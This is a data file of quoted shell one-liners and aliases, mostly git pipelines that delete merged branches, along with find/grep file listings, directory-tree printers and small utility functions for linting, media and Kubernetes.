"git log --format=format: --name-only | egrep -v ""^$"" | sort | uniq -c | sort -r > commit_frequency.log"
"git grep -ne "" TODO:"" -ne "" FIXME:"" -ne "" HACK:""|tr -d "" ""|grep --color=auto ""TODO\|FIXME\|HACK"""
"git fetch --prune; git branch -a --merged | grep -E ""^..remotes/origin"" | cut -c 18- | grep -vE -e ""^HEAD "" -e ""^develop$"" -e ""^master$"" | xargs -r git push origin --delete"
"git fetch --all --prune && git branch | grep -v ""^*"" | grep -v ""^master$"" | fzf -m | xargs git branch -D"
"git fetch && git branch --merged | egrep -v ""\\*|master|develop"" | xargs -I % git branch -d %"
"git diff |grep ""+++ b"" |percol |sed ""s/+++ b\///g"" |xargs git add"
"git diff master --numstat | cut -f 3 | grep ""\.rb$"" | xargs ls 2>/dev/null | xargs rubocop -a"
"git diff develop | grep -E -A8 ""((JPADS)FSW.[0-9]+.*)|(todo.*)"" --color=always | cut -c 2- | less -r"
"git diff -p -R --no-color | grep -E ""^(diff|(old|new) mode)"" --color=never | git apply"
"git diff --name-only | grep '\.rb' | tr '\n' ' ' | sed 's/,$/\n/' | xargs rubocop"
"git commit --fixup $(gl develop..HEAD | grep -v ""fixup!"" | head -n20 | fzf | cut -f1 -d\ )"
"git checkout master; git remote prune origin; git branch --merged | grep -v ""\*"" | grep -v master | grep -v dev | xargs -n 1 git branch -d"
"git checkout master; git branch --merged | egrep -v ""(^\*|master|dev)"" | xargs git branch -d"
"git checkout master && git pull && git remote prune origin && git branch --merged master | egrep -v ""(master|staging|production)$"" | xargs git branch -d && git gc"
"git checkout master && git branch --merged |grep -v ""\*"" | grep -v master |grep -v stable | xargs -n1 git branch -d"
"git checkout master && git branch --merged | egrep -v ""(^\*|master|dev)"" | xargs git branch -d"
"git checkout $(git branch| cut -b 3- | grep -v -- ""->"" | peco | sed -e ""s%remotes/origin/%%"")"
"git checkout $(git branch | sort -r | fzf | sed -e ""s/* //"" | sed -e ""s/ *//"")"
"git checkout $(git branch -a | sed -e ""s/^\*\s*//g"" | grep -v ""HEAD"" | awk ""{print $1}"" | peco --prompt ""GIT BRANCH >"")"
"git checkout $(git branch -a | sed ""s/remotes\/origin\///"" | sort | uniq | pick)"
"git checkout $(git branch -a --sort=-authordate | cut -b 3- | grep -v -- ""->"" | peco | sed -e ""s%remotes/origin/%%"")"
"git checkout $(gba | sed -e ""s/ remotes\/origin\///g"" -e ""s/[* ]//g"" | sort | uniq | fzf-tmux -r 30% --reverse)"
"git branch | remove-colors | egrep -v ""master|\*"" | xargs git branch -D"
"git branch | grep topic | grep -vE ""^\*|\/$USER\/"" | xargs -n1 git branch -d"
"git branch | grep ^[\*\s] | grep -o ""\(\w*\|\-\|\/\)*"""
"git branch | grep \* | cut -d"" "" -f2 | tr -d ""\n"" | pbcopy"
"git branch | grep -v -E ""master|develop|release"" | xargs -n 1 git branch -d"
"git branch | grep -v ""master\|development\|\*"" | xargs git branch -D && git fetch -p"
"git branch | grep -v ""master\|develop\|$(git rev-parse --abbrev-ref HEAD)"" | xargs git branch -D && echo ""So tidy!"""
"git branch | grep -v ""^*"" | grep -v ""^master$"" | fzf -m | xargs git branch -D"
"git branch | grep -v ""*"" | grep -v ""develop\|master"" | xargs -I % git branch -d %;git fetch --prune"
"git branch | egrep -v ""(master|dev|\*)"" | xargs git branch -D"
"git branch | egrep -v ""(master|develop|\*)"" | xargs git branch -D"
"git branch | egrep -v ""(^\*|master|dev)"" | xargs git branch -d"
"git branch | egrep -v ""(^\*|master|dev)"" | xargs git branch -D"
"git branch | egrep -v ""(^\*|develop|master)"" | xargs git branch -D"
"git branch -vv | grep -P ""\[origin.*?: gone\]"" | grep -oP ""^\s*(hotfix|SMS)[^\s]+"" | xargs -n 1 git branch -D"
"git branch -vv | grep "": gone]""| grep -v ""\*"" | awk ""{ print $1; }"" | gxargs -r git branch -d"
"git branch -vv | gawk '{print \$1,\$4}' | grep 'gone]' | gawk '{print \$1}' | xargs git branch -d"
"git branch -r | grep nwhyte | sed ""s/^*//"" | sed ""s/\ *origin\///"" | sort"
"git branch -r --sort=creatordate --format ""%(creatordate:relative);%(committername);%(refname:lstrip=-1)"" | grep -v "";HEAD$"" | column -s "";"" -t | tac | less"
"git branch -r --merged | grep -ve master | grep -ve prod | sed ""s/origin\///"" | xargs -n 1 git push --delete origin"
"git branch -l | grep -v ""*"" | grep -v upstream-master | xargs git branch -d 2>&1 | grep -v ""If you are sure"" ; git fetch --all --prune"
"git branch -d `git branch --merged | grep -v ""\*"" | egrep -v ""(master|develop|richard)""`"
"git branch -a | peco | sed -e ""s/\* //g"" | awk ""{print \$1}"" | perl -ple ""s%remotes/[^/]+/%%"""
"git branch -a --merged | grep -v master | grep remotes/origin| sed -e ""s% *remotes/origin/%%"" | xargs -I% git push origin :%"
"git branch --set-upstream-to=origin/$(git branch | grep \* | cut -d "" "" -f 2) $(git branch | grep \* | cut -d "" "" -f 2)"
"git branch --no-color --merged | command grep -vE ""^(\*|\s*master\s*$|\s*develop\s*$)"" | command xargs -n 1 git branch -d"
"git branch --merged|egrep -v ""\*|develop|master""|xargs git branch -d"
"git branch --merged| egrep -v ""(^\*|prod|dev)"" | xargs -r git branch -d"
"git branch --merged| egrep -v ""(^\*|master|dev)"" | xargs git branch -d"
"git branch --merged=dc-master/resolved | egrep ""(BUGZID|WS-)"" | grep -v ""^*"" | xargs git branch -d; git fetch origin --prune;"
"git branch --merged | grep -vE ""^\*|master$|develop$"" | xargs -I % git branch -d %"
"git branch --merged | grep -vE ""^\*| master$| develop$"" | xargs git branch -d"
"git branch --merged | grep -vE ""(^\*|master|dev)"" | xargs git branch -d"
"git branch --merged | grep -v master | grep -v develop | grep -v ""*"" | while read BRANCH; do git branch -d ${BRANCH}; done; unset BRANCH;"
"git branch --merged | grep -v master | grep -v ""^\*"" | cut -d "" "" -f3 | xargs git branch -d"
"git branch --merged | grep -v master | grep -v ""*"" | cut -c3- | xargs -I {} git branch -d {}"
"git branch --merged | grep -v \""\*\"" | grep -v master | grep -v dev | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\\*\\|master\\|develop"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*\|master\|deploy"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v release | grep -v master | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v master | grep -v staging | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v master | grep -v development | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v master | grep -v develop | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v master | grep -v devel | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v master | grep -v dev | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v develop | grep -v master | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v develop | grep -v dev | xargs -n 1 git branch -d && git fetch -p"
"git branch --merged | grep -v ""\*"" | grep -v ""master"" | grep -v ""develop"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v ""master"" | grep -v ""dev"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | egrep -v ""master|develop"" | xargs -n 1 git branch -d"
"git branch --merged | grep -Ev \""(^\\*|master|^develop)\"" | xargs -n 1 git branch --delete"
"git branch --merged | grep -Ev ""(\*|master|release)"" | xargs -n 1 git branch -d"
"git branch --merged | grep -Ev ""(\*|master|develop)"" | xargs -n 1 git branch -d; git pull --prune"
"git branch --merged | grep -Ev ""(\*|master|develop)"" | xargs -n 1 git branch -d"
"git branch --merged | grep -E ""(feature|bugfix|hotfix)"" | xargs -n 1 git branch -d"
"git branch --merged | grep --extended-regexp --invert-match ""(^\*|master)"" | cut --characters=3- | xargs --no-run-if-empty --interactive git branch --delete"
"git branch --merged | egrep -v ""master|develop|dev"" | xargs git branch -d"
"git branch --merged | egrep -v ""^\*|master|develop"" | xargs -n 1 git branch -d"
"git branch --merged | egrep -v ""\*|master|dev"" | xargs -n 1 git branch -d"
"git branch --merged | egrep -v ""(^\*|master|staging)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|staging)"" | xargs git branch -d && gbp"
"git branch --merged | egrep -v ""(^\*|master|release)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|qa)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|develop|stage)"""
"git branch --merged | egrep -v ""(^\*|master|develop)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|develop)"" | xargs -n 1 git branch -d"
"git branch --merged | egrep -v ""(^\*|master|dev)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|dev)"" | xargs git branch -d && git remote prune origin"
"git branch --merged | egrep -v ""(^\*|master|dev)"" | xargs git branch -d && git gc"
"git branch --merged | egrep -v ""(^\*|master|dev)"" | xargs git branch -d && git fetch --prune && git rebase --autostash FETCH_HEAD"
"git branch --merged | egrep -v ""(^\*|master|dev)"" | xargs git branch -d "
"git branch --merged | egrep -v ""(^\*|master|dev)"" | xargs git branch -D"
"git branch --merged | egrep -v ""(^\*|master|dev)"" | xargs -n 1 git branch -d"
"git branch --merged | egrep -v ""(^\*|master|dev)"" | xargs --no-run-if-empty git branch -d"
"git branch --merged | egrep -v ""(^\*|master|${1:-develop)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|develop|master)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\* |master|dev)"" | xargs git branch -d"
"git branch --merged | command grep -vE ""^(\*|\s*(master|develop)\s*$)"" | command xargs -n 1 git branch -d"
"git branch --merged origin/HEAD | command grep -vE ""^(\*|\s*master\s*$|\s*develop\s*$)"" | command xargs -n 1 git branch -d"
"git branch --merged master | grep -v ""master$"" | grep -v ""develop$"" | grep -v ""staging$"" | xargs git branch -d"
"git branch --merged master | grep -E ""fix\/|feature\/"" | grep -vE ""^\*"" | xargs -I % git branch -d %"
"git branch --merged master | egrep -v ""(^\*|master|dev)"" | xargs -n 1 git branch -d; git remote prune origin"
"git branch --merged master | command grep -vE ""^(\*|\s*develop\s*|\s*master\s*$)"" | command xargs -n 1 git branch -d"
"git branch --merged development | egrep -v ""(^\*|master|dev)"" | xargs git branch -d"
"git branch --merged develop | egrep -v \""(^\*|master|develop)\"" | xargs -r git branch -d"
"git br -a | sed ""s/remotes\/origin\///""| uniq | fzf | xargs git co"
"git br --merged | egrep -v ""(\*|master|develop)"" | xargs -n 1 git br -d"
"git add . && git commit -v && git push && git show head | head -1 | cut -d "" "" -f 2 | tr -d ""\n"" | pbcopy"
"git --no-pager log -n 40 -w --reverse --pretty=tformat:""%C(black)%cr%Creset|%C(yellow)%an%Creset|%s %C(blue)%h%Creset%C(magenta)%d%Creset"" | column -t -s ""|"""
"git --no-pager lg -25 | ipt | cut -d "" "" -f 1 | sed ""s,\x1B\[[0-9;]*[a-zA-Z],,g"" | xargs -I {}"
"gibo --upgrade --list | grep -A 30 Global | tail -n +3 | tr ""\n"" "" "" | xargs gibo"
"ghi show -w $(ghi list --sort updated | grep -v ""open issue"" | grep -v ""Not Found"" | peco | awk ""{ print $1 }"")"
"gco master && git branch --merged | grep -v ""\\*\\|master\\|develop"" | xargs -n 1 git branch -d"
"gbm | egrep -v ""(^\*|master|develop)"" | xargs git branch -d"
"gbl|perl -pe s/(?:.+)\\t// | grep -v ""^devel$"" | grep -v ""`git rev-parse --abbrev-ref HEAD`"" | head -n 1"
"gb | selecta | tr -d ""*"" | tr -d "" "" | pbcopy"
"g log --color=never | head -n 1|cut -d "" "" -f 2|te|clc"
"function _last() { history | grep -E ""^ $1 +"" | grep -v grep | tail -1 | sed -E ""s/^ [0-9]+ +//"" };_last"
"function _kdp(){ kubectl get po | cut -d"" "" -f1 | ack $1 | head -n 1 | xargs kubectl delete po ; };_kdp"
"function MB() { Comment_Character=""#""; Alias_Character=""alias""; Help=""""; Alias=""""; while read line; do if [[ $line == $Comment_Character* ]]; then Help=""$Help""""\n""""$line""; else Alias_Found=`echo ""$line""| grep $Alias_Character`; if [[ M""$Alias_Found"" != ""M"" ]]; then Alias=`echo ""$line""| cut -d""="" -f1 | tr -s "" ""| cut -d"" "" -f2`; if [[ M""$Alias"" != ""M"" ]]; then echo -e ""\n$Alias"" : ""$Help""; Help=""""; fi; else Help=""""; fi; fi; done < ""$FILENAME""; }; MB"
"function KUMAR() { Workspace; cd ..; remotes=`git remote show`; for remote in $remotes; do echo ""Cloning $remote ...""; remote_url=`git remote show $remote | grep -im1 URL | rev | cut -d"" "" -f1| rev`; git clone $remote_url; done; }; KUMAR"
"fortune | cowsay -f `cowsay -l | grep -v ""Cow files in"" | sed -e ""s/ /\\n/g"" | shuf -n1`"
"fortune -ea | cowsay -f ""$(find /usr/local/share/cows/ -type f | sort -R | head -1)"" -W $(($(tput cols) - 10)) | lolcat"
"for status in $(grep Current statuses | awk ""{print \$3}"" | sort | uniq); do printf ""%15s %8d\n"" ""$status"" ""$(grep $status statuses | wc -l)""; done"
"for k in `git branch|perl -pe s/^..//`;do echo -e `git show --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $k|head -n 1`\\t$k;done|sort | head -n 10"
"for k in `git branch|perl -pe s/^..//`;do echo -e `git show --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $k|head -n 1`\\t$k;done|sort -r | head -n 10"
"for k in `git branch | sed s/^..//`; do echo -e `git log -1 --pretty=format:""%ci %Cgreen%cr%Creset"" $k --`\\t""$k"";done | sort | sed -E ""s/^.{26}//"" | tail -n 20 -r"
"for k in `git branch -r|head 10|perl -pe s/^..//`;do echo -e `git show --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $k|head -n 1`\\t$k;done|sort -r"
"for k in $(git branch | sed /\*/d); do echo ""$(git log -1 --pretty=format:""%ct"" $k) $k""; done | sort -r | awk ""{print $2}"" | head"
"for k in $(git branch --merged|grep -v ""\->""|sed s/^..//);do echo -e $(git log -1 --pretty=format:""%Cgreen%ci %Cred%cr%Creset"" ""$k"")\\t""$k"";done|sort|more"
"for i in ~/.local/share/xorg/Xorg.*.log*; do echo ""From [""`ls -la --color=auto $i`""]:""; egrep -i ""\]\s\((WW|EE|\!\!|\?\?|NI)\)"" $i; echo; done"
"for i in `svn st | grep "".js"" | grep ""^\s*[A|M]"" | cut -c 8-`; do jshint $i;done"
"for i in `ls | cut -d""_"" -f6 | sort | uniq`; do echo $i : `ls *$i* | wc -l`;done"
"for i in `ls | cut -d""."" -f2 | sort | uniq`; do echo $i : `ls *$i* | wc -l`;done"
"for i in `ls -t | grep -ie ""mp4\|avi\|wmv\|3gp""`; do echo -e ""\n\n$YELL_COLOR Playing $i ... $NORM_COLOR""; sleep 2; nvgstplayer --stats -i $i $NORM_COLOR\n; done"
"for i in `git status -s | grep -v ""^\s*D\|^?"" | grep "".js"" | cut -c 4-`; do jshint $i;done"
"for i in `find . -type d -name surefire-reports` ; do echo $i : `grep ""Tests run: "" $i/*.txt | cut -d "" "" -f 3 | tr -s ""\n"" "" "" | sed -e ""s/,/ +/g"" -e ""s/$/0\n/"" | bc` ; done"
"for i in `apk info | grep -v WARNING`; do size=`apk info -v $i | tail -n 1 | cut -d"" "" -f2`; printf ""%9s %s\n"" $size $i; done | sort -n"
"for i in *; do echo ""`ls -1aRi ""$i"" | awk ""/^[0-9]+ / { print $1 }"" | sort -u | wc -l` $i"" ; done | sort -n"
"for f in $(ls | grep ""\.\(tar\|gz\|tgz\|bz2\)""); do tar xf ""$f"" && rm -f ""$f""; done"
"for f in $(ls -1 redsea.*.txt | awk -F. ""{ print \$2 \"" \"" \$0; }"" | sort -n | awk ""{ print \$2; }"" ) ; do if [ $(grep -c \""ps\"": $f) -gt 0 ]; then echo -e ""\\n***\\n*** $f\\n***\\n"" ; cat $f |grep \""ps\"": ; fi ; done"
"for f in $(ls -1 redsea.*.txt | awk -F. ""{ print \$2 \"" \"" \$0; }"" | sort -n | awk ""{ print \$2; }"" ) ; do if [ $(grep -c \""pi\"": $f) -gt 0 ]; then echo -e ""\\n***\\n*** $f\\n***\\n"" ; cat $f |grep \""pi\"": ; fi ; done"
"for f in $(git ls-tree --name-only -r HEAD | grep js$); do cat $f | wc -l ; echo $f; done | paste -d "","" - - | sort -n"
"for f in $(find -name "".tox"" -or -name ""env"" -or -name ""env_container"" -or -name ""build"" -or -name ""dist"" | grep -vE ""boost|Compose|footprinter|memegen""); do rma ""$f""; done"
"for d in `find / -type d -name libvirt | egrep -v ""backup|vagrant|home|log""` ; do grep -R ""192.168"" $d; done"
"for d in `find . -type d | grep -v ""doxydocs\|external\|RPMBUILD\|build""`; do ln $PWD/tags $d/; done"
"for branch in `git branch | grep -v HEAD`;do echo -e `git show --format=""%ci %cr"" $branch | head -n 1` \\t$branch; done | sort -r | less"
"for branch in `git branch -r | grep -v HEAD`;do echo -e `git show --format=""%ci %cr"" $branch | head -n 1` \\t$branch; done | sort -r | less"
"for branch in `git branch -r | grep -v HEAD`;do echo -e `git show --format=""%ci %cr"" $branch | head -n 1` \\t$branch; done | sort -r | head -n 20"
"for branch in $(git for-each-ref --format=""%(refname)"" refs/heads/ | sed ""s|refs/heads/||""); do desc=$(git config branch.$branch.description); if [[ $branch == $(git rev-parse --abbrev-ref HEAD) ]]; then branch=""* \033[0;32m$branch\033[0m""; else branch="" $branch"" fi; echo -e ""$branch \033[0;36m$desc\033[0m"" ; done"
"for branch in $(git branch -r | grep -v HEAD);do echo -e \[$(basename `git rev-parse --show-toplevel`)\] $branch \($(git show --format=""%an | %ai %ar"" $branch | head -n 1)\); done | sort -r"
"for box in `find ~/Entwicklung -name ""Vagrantfile"" | grep -v ark | grep -v tmp | grep -v cookbooks`; do bx=$(dirname $box); s=$(cd $bx >/dev/null && vagrant status 2>/dev/null | grep running); if [ ! -z ""$s"" ]; then echo -e ""${bx}\n${s}""; fi ; done"
"for a in $(find .git/objects -type f -depth 2 | rg -v ""pack|info"" | rg "".git/objects/|/"" -r """"); do echo -n $a; echo -n "" ""; echo $(git cat-file -t $a); done;"
"firefox --new-tab $(git remote get-url origin | sed -E ""s|\.git$|/pipelines|"")"
"find ~/HW1/usr/toukmond/shovel.o >& ~/_ && find .w/boulder.o >& ~/_ && mv -t . ~/HW1/.blocked/card.o 2> ~/_ && echo ""I think you found something."" || ( find ~/HW1/usr/toukmond/shovel.o >& ~/_ && echo ""Digging here reveals nothing."" ) || echo ""You have nothing with which to dig."" ; ig"
"find | grep ""\.c$\|\.h$\|.sh$"" | grep -v "
"find node_modules -type l -maxdepth 1 | sed -e ""s|node_modules/||"""
"find `pwd` -type d -regex "".*\(node_modules\|temp\|tmp\|bower_components\|cache\)$"" -prune -exec docker exec -t -i dropbox dropbox exclude add {} \;"
"find /usr/share/games/fortunes -name ""*.dat"" | xargs dirname | sort | uniq | xargs /usr/games/fortune -c"
"find ./.computer.o >& ~/_ && ( find ~/HW1/usr/toukmond/card.o >& ~/_ && echo ""As you put the CPU board in the computer, it immediately springs to life."" && echo ""The lights start flashing, and the fans seem to startup."" && rm .description >& ~/_ && mv -t ./ ~/HW1/.blocked/description >& ~/_ && touch ~/HW1/.blocked/computeron && rm ~/HW1/usr/toukmond/card.o >& ~/_ || echo ""You do not have the CPU card."" ) || echo ""There is nothing to insert anything into."" ;ig"
"find ./ -type f -not -path "".\/.git*"" -printf ""%T@ %p\n"" -ls | sort -n | cut -d"" "" -f 2- | xargs -r ls -la|peco"
"find . | sed -e ""s/[^-][^\/]*\// |/g"" -e ""s/|\([^ ]\)/|-\1/"""
"find . | grep -E ""(__pycache__|\.pyc|\.pyo)$"" | xargs rm -rf"
"find . | grep -E ""(__pycache__|\.pyc|\.pyo$)"" | xargs rm -rf"
"find . | grep -E ""(__pycache__|\.pyc|\.pyo$)"" | xargs rm -rf \;"
"find . | grep -E ""(__pycache__|\.pyc|\.pyo$$)"" | xargs rm -rf"
"find . | grep -E ""(__pycache__|.pyc|.pyo$)"" | xargs rm -rf"
"find . | grep ""\.pp$"" | xargs puppet-lint --no-quoted_booleans-check --no-class_inherits_from_params_class-check --no-80chars-check --fail-on-warnings --with-filename --with-context; find . | grep ""\.pp$"" | xargs puppet parser validate"
"find . | grep "".js"" | grep -v "".lib"" | grep -v "".json"" | xargs -I{} java -jar ~/Javascript/yuicompressor-2.4.2/build/yuicompressor-2.4.2.jar --preserve-semi -o {} {}"
"find . | grep ""..rb$"" | grep -v ""..erb$"" | xargs -L 1 ruby -c | grep -v ""Syntax OK"""
"find . | grep ""(__pycache__|\.pyc|\.pyo$)"" | xargs rm -rf"
"find . -xdev -type f | cut -d ""/"" -f 2 | sort | uniq -c | sort -n"
"find . -type f|grep -E "".cc|.cpp|.php|.py"" > cscope.files"
"find . -type f | perl -ne ""print $1 if m/\.([^.\/]+)$/"" | sort | uniq -c | sort -n"
"find . -type f | grep -E ""*.swp"" | rev | cut -d "" "" -f 1 | rev"
"find . -type f \( -regex "".*\.\(html\|config\|pm\|\pl\)"" -o -regex "".*/[^/.]*$"" \) -a \( -not -regex "".*CVS.*"" \) -a \( -not -regex "".*~.*"" \) -a \( -not -regex "".*/tmp/.*"" \) -print0 | xargs -0 grep "
"find . -type f -printf ""%h\n"" | cut -d/ -f-2 | sort | uniq -c | sort -rn"
"find . -type f -print0 | xargs -0 stat -f ""%m %N"" | sort -rn | head -10 | cut -f2- -d"" """
"find . -type f -print0 | xargs -0 -n1 md5sum | sort -k 1,32 | uniq -w 32 -d --all-repeated=separate | sed -e 's/^[0-9a-f]*\ *//;'"
"find . -type f -name ""*.c"" -or -name ""*.h"" | xargs norminette | grep ""^Error"" || echo ""\n\e[92mAll files are correctly normed!\n\e[0m"""
"find . -type f -exec basename {} \; | sed -n ""s/..*\.//p"" | sort | uniq -c | sort -nr"
"find . -type d | sed -e ""s~[^-][^/]*/~ |~g"" -e ""s~|\([^ ]\)~|-\1~"""
"find . -type d | sed -e ""s/[^-][^\/]*\// |/g;s/|\([^ ]\)/|-\1/"""
"find . -type d | sed -e ""s/[^-][^\/]*\// |/g"" -e ""s/|\([^ ]\)/|-\1/"""
"find . -type d | sed -e ""s/[^-][^\/]*\// |/g"" -e ""s/|\([^ ]\)/|-\1/"
"find . -type d | sed -e ""s#[^-][^\/]*\/# |#g"" -e ""s#|\([^ ]\)#|-\1#"""
"find . -type d | sed ""s;[^/]*/;|-->;g;s;-->|; |;g"""
"find . -regextype ""egrep"" -regex "".*\.(c|cc|cxx|cpp)$"" -print0 | xargs -0 grep"
"find . -regex ""\(.*\.cpp\)\|\(.*\.hpp\)\|\(.*\.mk\)\|\(.*\.ttcn3\)"" | xargs -P 25 grep --color -rins "
"find . -print | sed -e ""s;[^/]*/;|____;g;s;____|; |;g"""
"find . -print | sed -e ""s;/*/;|;g;s;|; |;g"""
"find . -not -path ""./.git/*"" | sed -e ""s/[^-][^\/]*\// |/g"" -e ""s/|\([^ ]\)/|-\1/"""
"find . -not -iwholename ""*.git*"" -type f | egrep -i -E -o ""\.{1}\w*$"" | sort | uniq -c | sort -rn"
"find . -name .git -prune -o -type d | sed -e ""s/[^-][^\/]*\// |/g"" -e ""s/|\([^ ]\)/|-\1/"""
"find . -name .git -prune -o -print | sed -e ""s/[^-][^\/]*\// |/g"" -e ""s/|\([^ ]\)/|-\1/"""
"find . -name ""*.c|*.cc|*.cpp|*.h"" | xargs grep $1 -wn"
"find . -name ""*.avi"" -o -name ""*.mpg"" -o -name ""*.mpeg"" -o -name ""*.mp4"" -o -name ""*.qt"" -o -name ""*.mkv"" -o -name ""*.m2v"" | while read file; do test -f ""${file%.*}.txt"" || (qnapi ""$file"" | grep ""Dopasowywanie"" > /dev/null && echo ""Downloaded subtitles for $file""); done"
"find . -maxdepth 1 -type f | sed ""s|\./||"""
"find . -maxdepth 1 -type d | sort | while read -r d; do printf ""%+7s %7d %s\n"" `du -s ""$d"" | cut -f1` `find ""$d"" -type f | wc -l` $d; done"
"find . -maxdepth 1 -type d | sed -e ""s/^.\///"" | while read -r dir; do num=$(find ""$dir"" -type f | wc -l); printf ""%d\t%s\n"" ""$num"" ""$dir""; done | sort -nr"
"find . -maxdepth 1 -type d | grep -v ^\\.$ | xargs -i du -sk {} | sort -n | awk \""{sum+=\\\$1;print}END{print \\\""TOTAL: \\\""sum/1024\\\""MB\\\""}\"""
"find . -maxdepth 1 -mindepth 1 -type d | grep -v ""^\./\."" | xargs -L1 -I% sh -c ""cd %; git diff --quiet --exit-code || echo %"""
"find . -depth 1 -type d | sort | while read -r dir; do n=$(find ""$dir"" -type f | wc -l); printf ""%4d : %s\n"" $n ""$dir""; done | sort -n"
"find . -depth 1 -exec mdls -name kMDItemFSName -name kMDItemDateAdded ""{}"" \; | sed -e ""s/^kMDItemFSName = \""\(.*\)\""/ \1/g"" | sed ""N;s/\n//"" | sed -e ""s/(null)/0000-00-00 00:00:00 +0000/g"" | "
"find -type f | egrep ""(\.js|\.js.in)$"" | xargs cat | wc -l"
"find -type f -ls | sort -k 7 -r -n | head |tr -s ' ' | cut -d' ' -f7,11,12,13,14,15,16,17,18,19"
"find -type d -name .git 2>/dev/null | sed -E ""s|^\./(.+)/\.git$|\1|"""
"find -E . -regex "".*\.(c|h|cpp|hpp)"" | xargs grep --color=auto"
"find $PWD -name ""*.[cpp|cc|h|hpp]"" | cscope -bkqvR -i -"
"files-chaged | grep src | sort | uniq | xargs rgrep ""@todo"""
"ff -i ""\.(c|h|cpp|hpp)$""|xargs -d ""\n"" egrep -In"
"feh -Tmanga --start ""$(cat .progress 2>/dev/null || (ls *.png *.jpg 2>/dev/null | sort | head -1))"" . 2>/dev/null"
"fcd ps | grep Exit | fzf -m --cycle | awk ""{print $1}"" | xargs docker start"
"fc -l 1 | sed ""s/^ *[0-9]* *//"" | grep -P ""^[\w\\-]+([^\w/=@]|$)"" -o | grep -P ""^[\w\\-]+"" -o"
"f=$(ls -r --file-type --sort=time ~/Guignols/guignol_*|head -n 1|cut -d"" "" -f9); [[ -f $f ]] && mplayer -fs $f && rm $f || echo ""Pas de nouveaux épisodes"""
"f(){ x=""$(sk --bind ""ctrl-p:toggle-preview"" --ansi -i -c ""rg --color=always --line-number \""{}\"""" --preview=""preview.sh -v {}"" )""; [[ $? -eq 0 ]] && emacs ""+$(echo $x|cut -d: -f2)"" ""$(echo $x|cut -d: -f1)"" || true ; }; f"
"f(){ x=""$(sk --ansi -i -c ""rg --color=always --line-number \""{}\"""")""; [[ $? -eq 0 ]] && nvim ""$(echo $x|cut -d: -f1)"" ""+$(echo $x|cut -d: -f2)"" || true }; f"
"f(){ if [[ ""$1"" == -p || ""$1"" == -s || -z ""$1"" ]]; then ~/bin/cdd $@; else cd $(~/bin/cdd $@); fi; unset -f f; }; f"
"f() {mplayer $(wget https://rss.simplecast.com/podcasts/1684/rss -O- 2>/dev/null| grep ""enclosure"" | tac | sed -n $1p | cut -f2 -d""\"""")}; f"
"export teeargs=`ps -eo args | grep tee | grep -v grep | grep /usr/discreet/log/flare | cut -d\ -f3` ; killall -v -s9 flare_LINUX_2.6_x86_64 ; killall -s9 ""tee -a ""$teeargs"""""
"export teeargs=`ps -eo args | grep tee | grep -v grep | grep /usr/discreet/log/flamepremium | cut -d\ -f3` ; killall -v -s9 flamepremium_LINUX_2.6_x86_64 ; killall -s9 ""tee -a ""$teeargs"""""
"export teeargs=`ps -eo args | grep tee | grep -v grep | grep /usr/discreet/log/flame | cut -d\ -f3` ; killall -v -s9 flame_LINUX_2.6_x86_64 ; killall -s9 ""tee -a ""$teeargs"""""
"export PATH=""$(echo $PATH | tr "":"" ""\n"" | uniq | grep -v ""$(dirname $ORIG_DIR)"" | tr ""\n"" "":"")""; if [[ ""$PATH"" =~ "
"export LOG_LEVEL=trace; nodemon --delay 300ms server.js | ack -v ""eraro|gate-executor"" | ack ""^2016.*ERROR.*act.*OUT.*\/.*\{.*\}"" --no-color | awk ""{\$1=\""\"";\$3=\""\""; \$NF=\""\""; \$(NF-1)=\""\""; \$(NF-2)=\""\""; print\"" \n\""\$0}"""
"export APISERVER=$(kubectl config view | rg -A1 "".minikube"" | rg https | cut -f 2- -d "":"" | tr -d "" "")"
"eval $(cef | grep ""^[a-zA-Z]"" | cut -d "" "" -f1 | grep -v ""^base$"" | xargs -I % echo ""conda activate %; pip install -U pip ptpython jedi pynvim flake8 pylint;""); conda deactivate"
"eval $(aws ecr get-login --no-include-email | sed ""s|\(https://.*\.com\).*$|\1|"")"
"eval $(aws --region us-east-2 ecr get-login --no-include-email | sed ""s|https://.*|https://docker.oaganalytics.com|"")"
"eval ""$(history | sed ""s/^\s*[0-9]\+\s\+//"" | grep ""^aps \([-a-zA-Z0-9]\+\s*\)*$"" | tail -n1 | sed ""s/^aps /api /"")"""
"errpt -a | /bin/grep -E -- ""LABEL:|Date/Time|^/""|more"
"env|egrep ""(WHBS|CROSS|BUILD_BASE_DIR)""|sort"
"env |grep --color=always ""ROS\|CMAKE_PREFIX_PATH\|PYTHONPATH"" |sort"
"env | egrep ""^cd(inst|src|test)="" | sort"
"emoji-fzf preview | fzf --preview ""emoji-fzf get --name {1}"" | cut -d "" "" -f 1 | emoji-fzf get | xclip"
"elinks -dump randomfunfacts.com | egrep ""\|.*\||\+\-"""
"echo | openssl s_client -connect $1:443 2>/dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > tmp.pem && openssl x509 -subject -dates -fingerprint -in tmp.pem | grep SHA1 | sed 's/://g'"
"echo https://$(git remote -v | grep -oh ""bitbucket.org[:/][^ ]\+.git"" | head -1 | sed ""s/:/\//"" | sed ""s/\.git$//"")"
